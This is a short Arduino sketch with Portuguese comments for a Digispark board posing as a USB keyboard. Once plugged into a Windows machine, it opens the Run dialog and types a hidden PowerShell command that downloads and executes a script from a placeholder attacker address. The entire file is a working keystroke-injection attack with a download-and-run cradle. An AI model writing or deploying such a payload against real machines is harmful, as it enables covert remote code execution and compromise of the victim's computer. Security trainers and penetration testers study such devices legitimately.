#include "DigiKeyboard.h"
void setup() {

}

void loop() {

  
  //Windows R
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  //Aguarda 500 Milisegundos
  DigiKeyboard.delay(500);
  //Digitar powershell e dar enter
  DigiKeyboard.print("powershell -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString('http://<ip-do-atacante>/<payload-atacante.ps1>')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  //Para parar o loop
  for(;;){}
}


